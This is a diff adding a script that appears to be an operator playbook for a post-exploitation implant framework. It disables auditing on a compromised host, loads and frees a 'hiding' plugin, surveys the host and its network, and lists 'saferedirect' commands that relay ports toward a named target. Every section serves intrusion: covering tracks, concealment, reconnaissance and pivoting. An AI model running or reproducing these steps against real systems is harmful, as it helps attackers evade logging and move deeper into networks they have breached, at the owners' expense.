@@ -1,0 +1,47 @@
+#####################################################
+#             Audit Section
+#####################################################
+`script DisableAuditing.eps`;
+pause;
+
+#####################################################
+#             Monitors Section
+#####################################################
+ifnot (`loadplugin monitoringplugin`) {
+	echo "Failure loading monitor plugin. Exiting..";
+	return false;
+}
+
+`checkmouse`;
+`netstatmon`;
+`processmonitor`;
+`plugins`;
+`channels`;
+
+echo "If we are not doing a modify_audit or audit -off we can free the hiding plugin....";
+if (prompt "Ok to free the plugin?"){
+	 `freeplugin hidingplugin`;
+}
+
+pause;
+`processlist`;
+
+#####################################################
+#             Network Section
+#####################################################
+ifnot (`loadplugin networkplugin`){
+	echo "Faliure loading network plugin. Exiting..";
+	return false;
+}
+`portmap`;
+`arp`;
+`netmap`;
+pause;
+`netbios -local`;
+`route`;
+
+echo "Ping the hammermill target and then set up the redirectors";
+echo "For sampleman we need to use SAFEREDIRECT";
+echo "saferedirect -tcp -lplisten 2221 -target (target IP) 79 -bind (our 10. address)";
+echo "saferedirect -tcp -lplisten 2222 -target (target IP) 23 -bind (our 10. address)";
+echo "saferedirect -tcp -lplisten 2223 -target (target IP) 23 -bind (our 10. address)";
